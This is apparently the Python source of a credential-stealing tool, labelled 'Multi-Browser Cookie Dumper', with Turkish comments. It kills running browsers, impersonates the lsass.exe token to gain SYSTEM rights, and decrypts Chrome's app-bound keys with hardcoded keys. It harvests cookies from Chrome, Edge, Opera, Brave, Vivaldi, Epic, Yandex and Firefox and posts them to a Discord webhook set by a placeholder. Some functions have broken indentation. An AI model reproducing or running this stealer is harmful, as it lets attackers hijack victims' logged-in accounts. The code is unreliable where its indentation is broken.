import os
import io
import sys
import json
import struct
import ctypes
import sqlite3
import pathlib
import binascii
import requests
import time
import subprocess
from datetime import datetime
from contextlib import contextmanager

import windows
import windows.security
import windows.crypto
import windows.generated_def as gdef

from Crypto.Cipher import AES, ChaCha20_Poly1305

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def kill_browsers():
    """Chrome hariç tüm tarayıcıları kill et"""
    browsers_to_kill = [
        "msedge.exe",      # Edge
        "opera.exe",       # Opera
        "firefox.exe",     # Firefox
        "brave.exe",       # Brave
        "vivaldi.exe",     # Vivaldi
        "epic.exe",        # Epic
        "browser.exe",     # Yandex
        "chrome.exe"       # Chrome (son olarak)
    ]
    
    print("🔪 Tarayıcılar kapatılıyor...")
    
    for browser in browsers_to_kill:
        try:
            # Taskkill ile process'i sonlandır
            result = subprocess.run(['taskkill', '/F', '/IM', browser], 
                                  capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                print(f"✅ {browser} kapatıldı")
            else:
                print(f"ℹ️ {browser} zaten kapalı veya bulunamadı")
        except Exception as e:
            print(f"❌ {browser} kapatma hatası: {e}")
    
    print("⏳ Tarayıcıların tamamen kapanması için 3 saniye bekleniyor...")
    time.sleep(3)

@contextmanager
def impersonate_lsass():
    """impersonate lsass.exe to get SYSTEM privilege"""
    original_token = windows.current_thread.token
    try:
        windows.current_process.token.enable_privilege("SeDebugPrivilege")
        proc = next(p for p in windows.system.processes if p.name == "lsass.exe")
        lsass_token = proc.token
        impersonation_token = lsass_token.duplicate(
            type=gdef.TokenImpersonation,
            impersonation_level=gdef.SecurityImpersonation
        )
        windows.current_thread.token = impersonation_token
        yield
    finally:
        windows.current_thread.token = original_token

def parse_key_blob(blob_data: bytes) -> dict:
    buffer = io.BytesIO(blob_data)
    parsed_data = {}

    header_len = struct.unpack('<I', buffer.read(4))[0]
    parsed_data['header'] = buffer.read(header_len)
    content_len = struct.unpack('<I', buffer.read(4))[0]
    assert header_len + content_len + 8 == len(blob_data)
    
    parsed_data['flag'] = buffer.read(1)[0]
    
    if parsed_data['flag'] == 1 or parsed_data['flag'] == 2:
        # [flag|iv|ciphertext|tag] decrypted_blob
        # [1byte|12bytes|32bytes|16bytes]
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    elif parsed_data['flag'] == 3:
        # [flag|encrypted_aes_key|iv|ciphertext|tag] decrypted_blob
        # [1byte|32bytes|12bytes|32bytes|16bytes]
        parsed_data['encrypted_aes_key'] = buffer.read(32)
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    elif parsed_data['flag'] == 50:
        # Edge için özel flag - basit parsing
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    else:
        raise ValueError(f"Unsupported flag: {parsed_data['flag']}")

    return parsed_data

def decrypt_with_cng(input_data):
    ncrypt = ctypes.windll.NCRYPT
    hProvider = gdef.NCRYPT_PROV_HANDLE()
    provider_name = "Microsoft Software Key Storage Provider"
    status = ncrypt.NCryptOpenStorageProvider(ctypes.byref(hProvider), provider_name, 0)
    assert status == 0, f"NCryptOpenStorageProvider failed with status {status}"

    hKey = gdef.NCRYPT_KEY_HANDLE()
    key_name = "Google Chromekey1"
    status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0)
    assert status == 0, f"NCryptOpenKey failed with status {status}"

    pcbResult = gdef.DWORD(0)
    input_buffer = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)

    status = ncrypt.NCryptDecrypt(
        hKey,
        input_buffer,
        len(input_buffer),
        None,
        None,
        0,
        ctypes.byref(pcbResult),
        0x40   # NCRYPT_SILENT_FLAG
    )
    assert status == 0, f"1st NCryptDecrypt failed with status {status}"

    buffer_size = pcbResult.value
    output_buffer = (ctypes.c_ubyte * pcbResult.value)()

    status = ncrypt.NCryptDecrypt(
        hKey,
        input_buffer,
        len(input_buffer),
        None,
        output_buffer,
        buffer_size,
        ctypes.byref(pcbResult),
        0x40   # NCRYPT_SILENT_FLAG
    )
    assert status == 0, f"2nd NCryptDecrypt failed with status {status}"

    ncrypt.NCryptFreeObject(hKey)
    ncrypt.NCryptFreeObject(hProvider)

    return bytes(output_buffer[:pcbResult.value])

def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

def derive_v20_master_key(parsed_data: dict) -> bytes:
    cipher = None
    
    if parsed_data['flag'] == 1:
        aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
    elif parsed_data['flag'] == 2:
        chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
        cipher = ChaCha20_Poly1305.new(key=chacha20_key, nonce=parsed_data['iv'])
    elif parsed_data['flag'] == 3:
        xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
        with impersonate_lsass():
            decrypted_aes_key = decrypt_with_cng(parsed_data['encrypted_aes_key'])
        xored_aes_key = byte_xor(decrypted_aes_key, xor_key)
        cipher = AES.new(xored_aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
    elif parsed_data['flag'] == 50:
        # Edge için özel flag - AES ile dene
        aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])

    if cipher is None:
        raise ValueError(f"Unsupported flag: {parsed_data['flag']}")

    return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])

def find_firefox_profile():
    """Firefox profile'ını bul"""
    user_profile = os.environ['USERPROFILE']
    firefox_path = rf"{user_profile}\AppData\Roaming\Mozilla\Firefox\Profiles"
    
    print(f"🔍 Firefox profile aranıyor: {firefox_path}")
    
    if not os.path.exists(firefox_path):
        print("❌ Firefox: Profiles klasörü bulunamadı")
        return None
    
    profiles = os.listdir(firefox_path)
    print(f"📁 Firefox: {len(profiles)} profile bulundu")
    
    # Önce default profile'ları kontrol et
    for profile in profiles:
        print(f"🔍 Firefox: {profile} kontrol ediliyor...")
        if profile.endswith('.default') or profile.endswith('.default-release'):
            cookies_path = os.path.join(firefox_path, profile, "cookies.sqlite")
            if os.path.exists(cookies_path):
                print(f"✅ Firefox: {profile} profile'ında cookies.sqlite bulundu")
                return cookies_path
            else:
                print(f"❌ Firefox: {profile} profile'ında cookies.sqlite bulunamadı")
    
    # Default bulunamazsa tüm profile'ları kontrol et
    print("🔍 Firefox: Default profile bulunamadı, tüm profile'lar kontrol ediliyor...")
    for profile in profiles:
        cookies_path = os.path.join(firefox_path, profile, "cookies.sqlite")
        if os.path.exists(cookies_path):
            print(f"✅ Firefox: {profile} profile'ında cookies.sqlite bulundu")
            return cookies_path
    
    print("❌ Firefox: Hiçbir profile'da cookies.sqlite bulunamadı")
    return None

def save_cookies_netscape_simple(cookies_data, filename, browser_name):
    """Cookie'leri basit Netscape formatında kaydet"""
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("-------------------------HTTPS://T.ME/HAIRO13X7-----------------\n")
            for cookie in cookies_data:
                f.write(f"{cookie['domain']}\tTRUE\t/\tFALSE\t0\t{cookie['name']}\t{cookie['value']}\n")
        print(f"✅ {browser_name} cookie'leri {filename} dosyasına kaydedildi!")
        return True
    except Exception as e:
        print(f"❌ {browser_name} kaydetme hatası: {e}")
        return False

def send_browser_cookies_to_discord(cookies_data, webhook_url, browser_name):
    """Her tarayıcı için ayrı dosya gönder"""
    try:
        filename = f"{browser_name.lower()}_cookies.txt"
        save_cookies_netscape_simple(cookies_data, filename, browser_name)
        
        # Discord webhook payload
        files = {
            'file': (filename, open(filename, 'rb'), 'text/plain')
        }
        
        # Mesaj içeriği
        content = f"<:email_spacex:1429086532811358350> https://t.me/hairo13x7\n"
        content += f"<a:billing_postal:1429086529300598895> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        content += f"<a:billing_spacex:1429086530965868654> {browser_name}: {len(cookies_data)} cookie\n"
        
        payload = {
            'content': content,
            'username': 'https://t.me/hairo13x7',
            'avatar_url': 'https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&'
        }
        
        # Webhook'a dosya ile gönder
        response = requests.post(webhook_url, data=payload, files=files)
        
        # Dosyayı kapat
        files['file'][1].close()
        
        if response.status_code == 200:
            print(f"✅ {browser_name} cookie'leri Discord'a gönderildi!")
            return True
        else:
            print(f"❌ {browser_name} Discord gönderim hatası: {response.status_code}")
            return False
            
    except Exception as e:
        print(f"❌ {browser_name} Discord webhook hatası: {e}")
        return False

def extract_chrome_cookies(local_state_path, cookie_db_path):
    """Chrome cookie'lerini çıkar (orijinal yöntem - hiç dokunulmaz)"""
    try:
        if not os.path.exists(local_state_path) or not os.path.exists(cookie_db_path):
            return []
        
        print(f"🔍 Chrome cookie'leri çıkarılıyor...")
        
        # Read Local State
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)

        app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]
        assert(binascii.a2b_base64(app_bound_encrypted_key)[:4] == b"APPB")
        key_blob_encrypted = binascii.a2b_base64(app_bound_encrypted_key)[4:]
        
        # Decrypt with SYSTEM DPAPI
        with impersonate_lsass():
            key_blob_system_decrypted = windows.crypto.dpapi.unprotect(key_blob_encrypted)

        # Decrypt with user DPAPI
        key_blob_user_decrypted = windows.crypto.dpapi.unprotect(key_blob_system_decrypted)
        
        # Parse key blob
        parsed_data = parse_key_blob(key_blob_user_decrypted)
        v20_master_key = derive_v20_master_key(parsed_data)

        # Cookie'leri oku
        con = sqlite3.connect(pathlib.Path(cookie_db_path).as_uri() + "?mode=ro", uri=True)
        cur = con.cursor()
        r = cur.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) from cookies;")
        cookies = cur.fetchall()
        cookies_v20 = [c for c in cookies if c[2][:3] == b"v20"]
        con.close()

        # Cookie'leri çöz
        def decrypt_cookie_v20(encrypted_value):
            cookie_iv = encrypted_value[3:3+12]
            encrypted_cookie = encrypted_value[3+12:-16]
            cookie_tag = encrypted_value[-16:]
            cookie_cipher = AES.new(v20_master_key, AES.MODE_GCM, nonce=cookie_iv)
            decrypted_cookie = cookie_cipher.decrypt_and_verify(encrypted_cookie, cookie_tag)
            return decrypted_cookie[32:].decode('utf-8')

        cookies_data = []
        for c in cookies_v20:
            try:
                decrypted_value = decrypt_cookie_v20(c[2])
                cookies_data.append({
                    'domain': c[0],
                    'name': c[1], 
                    'value': decrypted_value,
                    'browser': 'Chrome'
                })
            except Exception as e:
                print(f"❌ Chrome hatası: {c[0]} - {c[1]} - {e}")
        
        print(f"✅ Chrome: {len(cookies_data)} cookie çözüldü")
        return cookies_data
        
    except Exception as e:
        print(f"❌ Chrome cookie çıkarma hatası: {e}")
        return []

def extract_chrome_based_cookies(local_state_path, cookie_db_path, browser_name):
    """Chrome tabanlı tarayıcılar için cookie çıkar"""
    try:
        if not os.path.exists(local_state_path) or not os.path.exists(cookie_db_path):
            return []
        
        print(f"🔍 {browser_name} cookie'leri çıkarılıyor...")
   
    # Read Local State
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]
    assert(binascii.a2b_base64(app_bound_encrypted_key)[:4] == b"APPB")
    key_blob_encrypted = binascii.a2b_base64(app_bound_encrypted_key)[4:]
    
    # Decrypt with SYSTEM DPAPI
    with impersonate_lsass():
        key_blob_system_decrypted = windows.crypto.dpapi.unprotect(key_blob_encrypted)

    # Decrypt with user DPAPI
    key_blob_user_decrypted = windows.crypto.dpapi.unprotect(key_blob_system_decrypted)
    
    # Parse key blob
    parsed_data = parse_key_blob(key_blob_user_decrypted)
    v20_master_key = derive_v20_master_key(parsed_data)

        # Cookie'leri oku
        con = sqlite3.connect(pathlib.Path(cookie_db_path).as_uri() + "?mode=ro", uri=True)
        cur = con.cursor()
        r = cur.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) from cookies;")
        cookies = cur.fetchall()
        cookies_v20 = [c for c in cookies if c[2][:3] == b"v20"]
        con.close()

        # Cookie'leri çöz
        def decrypt_cookie_v20(encrypted_value):
            cookie_iv = encrypted_value[3:3+12]
            encrypted_cookie = encrypted_value[3+12:-16]
            cookie_tag = encrypted_value[-16:]
            cookie_cipher = AES.new(v20_master_key, AES.MODE_GCM, nonce=cookie_iv)
            decrypted_cookie = cookie_cipher.decrypt_and_verify(encrypted_cookie, cookie_tag)
            return decrypted_cookie[32:].decode('utf-8')

        cookies_data = []
        for c in cookies_v20:
            try:
                decrypted_value = decrypt_cookie_v20(c[2])
                cookies_data.append({
                    'domain': c[0],
                    'name': c[1], 
                    'value': decrypted_value,
                    'browser': browser_name
                })
            except Exception as e:
                print(f"❌ {browser_name} hatası: {c[0]} - {c[1]} - {e}")
        
        print(f"✅ {browser_name}: {len(cookies_data)} cookie çözüldü")
        return cookies_data
        
    except Exception as e:
        print(f"❌ {browser_name} cookie çıkarma hatası: {e}")
        return []

def extract_edge_cookies(local_state_path, cookie_db_path):
    """Edge cookie'lerini çıkar - Chrome yöntemi ile"""
    try:
        if not os.path.exists(local_state_path) or not os.path.exists(cookie_db_path):
            return []
        
        print(f"🔍 Edge cookie'leri çıkarılıyor...")
        
        # Edge için Chrome yöntemini kullan
        # Read Local State
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)

        app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]
        assert(binascii.a2b_base64(app_bound_encrypted_key)[:4] == b"APPB")
        key_blob_encrypted = binascii.a2b_base64(app_bound_encrypted_key)[4:]
        
        # Decrypt with SYSTEM DPAPI
        with impersonate_lsass():
            key_blob_system_decrypted = windows.crypto.dpapi.unprotect(key_blob_encrypted)

        # Decrypt with user DPAPI
        key_blob_user_decrypted = windows.crypto.dpapi.unprotect(key_blob_system_decrypted)
        
        # Parse key blob
        parsed_data = parse_key_blob(key_blob_user_decrypted)
        v20_master_key = derive_v20_master_key(parsed_data)

        # Cookie'leri oku
        con = sqlite3.connect(pathlib.Path(cookie_db_path).as_uri() + "?mode=ro", uri=True)
        cur = con.cursor()
        r = cur.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) from cookies;")
        cookies = cur.fetchall()
        cookies_v20 = [c for c in cookies if c[2][:3] == b"v20"]
        con.close()

        # Cookie'leri çöz
        def decrypt_cookie_v20(encrypted_value):
            cookie_iv = encrypted_value[3:3+12]
            encrypted_cookie = encrypted_value[3+12:-16]
            cookie_tag = encrypted_value[-16:]
            cookie_cipher = AES.new(v20_master_key, AES.MODE_GCM, nonce=cookie_iv)
            decrypted_cookie = cookie_cipher.decrypt_and_verify(encrypted_cookie, cookie_tag)
            return decrypted_cookie[32:].decode('utf-8')

        cookies_data = []
        for c in cookies_v20:
            try:
                decrypted_value = decrypt_cookie_v20(c[2])
                cookies_data.append({
                    'domain': c[0],
                    'name': c[1], 
                    'value': decrypted_value,
                    'browser': 'Edge'
                })
            except Exception as e:
                print(f"❌ Edge hatası: {c[0]} - {c[1]} - {e}")
        
        print(f"✅ Edge: {len(cookies_data)} cookie çözüldü")
        return cookies_data
        
    except Exception as e:
        print(f"❌ Edge cookie çıkarma hatası: {e}")
        return []

def extract_opera_cookies(local_state_path, cookie_db_path):
    """Opera cookie'lerini çıkar - Chrome yöntemi ile"""
    try:
        if not os.path.exists(local_state_path) or not os.path.exists(cookie_db_path):
            return []
        
        print(f"🔍 Opera cookie'leri çıkarılıyor...")
        
        # Opera için Chrome yöntemini kullan
        # Read Local State
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)

        app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]
        assert(binascii.a2b_base64(app_bound_encrypted_key)[:4] == b"APPB")
        key_blob_encrypted = binascii.a2b_base64(app_bound_encrypted_key)[4:]
        
        # Decrypt with SYSTEM DPAPI
        with impersonate_lsass():
            key_blob_system_decrypted = windows.crypto.dpapi.unprotect(key_blob_encrypted)

        # Decrypt with user DPAPI
        key_blob_user_decrypted = windows.crypto.dpapi.unprotect(key_blob_system_decrypted)
        
        # Parse key blob
        parsed_data = parse_key_blob(key_blob_user_decrypted)
        v20_master_key = derive_v20_master_key(parsed_data)

        # Cookie'leri oku
    con = sqlite3.connect(pathlib.Path(cookie_db_path).as_uri() + "?mode=ro", uri=True)
    cur = con.cursor()
    r = cur.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) from cookies;")
    cookies = cur.fetchall()
    cookies_v20 = [c for c in cookies if c[2][:3] == b"v20"]
    con.close()

        # Cookie'leri çöz
    def decrypt_cookie_v20(encrypted_value):
        cookie_iv = encrypted_value[3:3+12]
        encrypted_cookie = encrypted_value[3+12:-16]
        cookie_tag = encrypted_value[-16:]
        cookie_cipher = AES.new(v20_master_key, AES.MODE_GCM, nonce=cookie_iv)
        decrypted_cookie = cookie_cipher.decrypt_and_verify(encrypted_cookie, cookie_tag)
        return decrypted_cookie[32:].decode('utf-8')

        cookies_data = []
    for c in cookies_v20:
            try:
                decrypted_value = decrypt_cookie_v20(c[2])
                cookies_data.append({
                    'domain': c[0],
                    'name': c[1], 
                    'value': decrypted_value,
                    'browser': 'Opera'
                })
            except Exception as e:
                print(f"❌ Opera hatası: {c[0]} - {c[1]} - {e}")
        
        print(f"✅ Opera: {len(cookies_data)} cookie çözüldü")
        return cookies_data
        
    except Exception as e:
        print(f"❌ Opera cookie çıkarma hatası: {e}")
        return []

def extract_firefox_cookies(cookie_db_path):
    """Firefox cookie'lerini dümdüz çıkar (şifreleme yok)"""
    try:
        if not cookie_db_path or not os.path.exists(cookie_db_path):
            print("❌ Firefox: Cookie dosyası bulunamadı")
            return []
        
        print(f"🔍 Firefox cookie'leri çıkarılıyor...")
        print(f"📁 Firefox cookie dosyası: {cookie_db_path}")
        
        con = sqlite3.connect(pathlib.Path(cookie_db_path).as_uri() + "?mode=ro", uri=True)
        cur = con.cursor()
        
        # Firefox cookie tablosunu kontrol et
        try:
            r = cur.execute("SELECT host, name, value from moz_cookies;")
            cookies = cur.fetchall()
            print(f"✅ Firefox: moz_cookies tablosu bulundu, {len(cookies)} cookie")
        except:
            # Alternatif tablo adları
            try:
                r = cur.execute("SELECT host, name, value from cookies;")
                cookies = cur.fetchall()
                print(f"✅ Firefox: cookies tablosu bulundu, {len(cookies)} cookie")
            except:
                print("❌ Firefox: Cookie tablosu bulunamadı")
                con.close()
                return []
        
        con.close()

        cookies_data = []
        for c in cookies:
            cookies_data.append({
                'domain': c[0],
                'name': c[1], 
                'value': c[2],  # Firefox'ta şifreleme yok, direkt value
                'browser': 'Firefox'
            })
        
        print(f"✅ Firefox: {len(cookies_data)} cookie çözüldü")
        return cookies_data
        
    except Exception as e:
        print(f"❌ Firefox cookie çıkarma hatası: {e}")
        return []

def main():
    # Sabit webhook URL
    WEBHOOK_URL = "%WEBHOOK%"
    
    print("🍪 Multi-Browser Cookie Dumper")
    print("=============================")
    
    # Tarayıcıları kill et
    kill_browsers()
    
    # Tüm tarayıcı cookie'lerini topla
    all_cookies = []
    
    # Tarayıcı yolları
    user_profile = os.environ['USERPROFILE']
    
    # Chrome (orijinal yöntem - hiç dokunulmaz)
    chrome_local_state = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Local State"
    chrome_cookies = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
    chrome_cookies_data = extract_chrome_cookies(chrome_local_state, chrome_cookies)
    all_cookies.extend(chrome_cookies_data)
    
    # Edge
    edge_local_state = rf"{user_profile}\AppData\Local\Microsoft\Edge\User Data\Local State"
    edge_cookies = rf"{user_profile}\AppData\Local\Microsoft\Edge\User Data\Default\Network\Cookies"
    edge_cookies_data = extract_edge_cookies(edge_local_state, edge_cookies)
    all_cookies.extend(edge_cookies_data)
    
    # Opera
    opera_local_state = rf"{user_profile}\AppData\Roaming\Opera Software\Opera Stable\User Data\Local State"
    opera_cookies = rf"{user_profile}\AppData\Roaming\Opera Software\Opera Stable\User Data\Default\Network\Cookies"
    opera_cookies_data = extract_opera_cookies(opera_local_state, opera_cookies)
    all_cookies.extend(opera_cookies_data)
    
    # Chrome tabanlı tarayıcılar
    chrome_based_browsers = [
        {
            "name": "Brave",
            "local_state": rf"{user_profile}\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State",
            "cookies": rf"{user_profile}\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
        },
        {
            "name": "Vivaldi",
            "local_state": rf"{user_profile}\AppData\Local\Vivaldi\User Data\Local State",
            "cookies": rf"{user_profile}\AppData\Local\Vivaldi\User Data\Default\Network\Cookies"
        },
        {
            "name": "Epic",
            "local_state": rf"{user_profile}\AppData\Local\Epic Privacy Browser\User Data\Local State",
            "cookies": rf"{user_profile}\AppData\Local\Epic Privacy Browser\User Data\Default\Network\Cookies"
        },
        {
            "name": "Yandex",
            "local_state": rf"{user_profile}\AppData\Local\Yandex\YandexBrowser\User Data\Local State",
            "cookies": rf"{user_profile}\AppData\Local\Yandex\YandexBrowser\User Data\Default\Network\Cookies"
        }
    ]
    
    # Chrome tabanlı tarayıcıları çıkar
    for browser_config in chrome_based_browsers:
        try:
            cookies_data = extract_chrome_based_cookies(browser_config["local_state"], browser_config["cookies"], browser_config["name"])
            all_cookies.extend(cookies_data)
        except Exception as e:
            print(f"❌ {browser_config['name']} cookie çıkarma hatası: {e}")
    
    # Firefox cookie'leri (özel yöntem)
    firefox_cookie_path = find_firefox_profile()
    firefox_cookies_data = extract_firefox_cookies(firefox_cookie_path)
    all_cookies.extend(firefox_cookies_data)
    
    print(f"\n📊 Toplam {len(all_cookies)} cookie tüm tarayıcılardan çözüldü!")
    
    if len(all_cookies) == 0:
        print("❌ Hiç cookie bulunamadı!")
        return
    
    # Tarayıcıya göre grupla
    browsers = {}
    for cookie in all_cookies:
        browser = cookie.get('browser', 'Unknown')
        if browser not in browsers:
            browsers[browser] = []
        browsers[browser].append(cookie)
    
    # Her tarayıcı için ayrı dosya gönder
    print(f"\n🚀 Cookie'ler Discord'a gönderiliyor...")
    for browser_name, browser_cookies in browsers.items():
        if len(browser_cookies) > 0:
            print(f"📤 {browser_name} cookie'leri gönderiliyor...")
            send_browser_cookies_to_discord(browser_cookies, WEBHOOK_URL, browser_name)
            time.sleep(1)  # Rate limit için bekle

if __name__ == "__main__":
    if not is_admin():
        print("This script needs to run as administrator.")
    else:
        main()
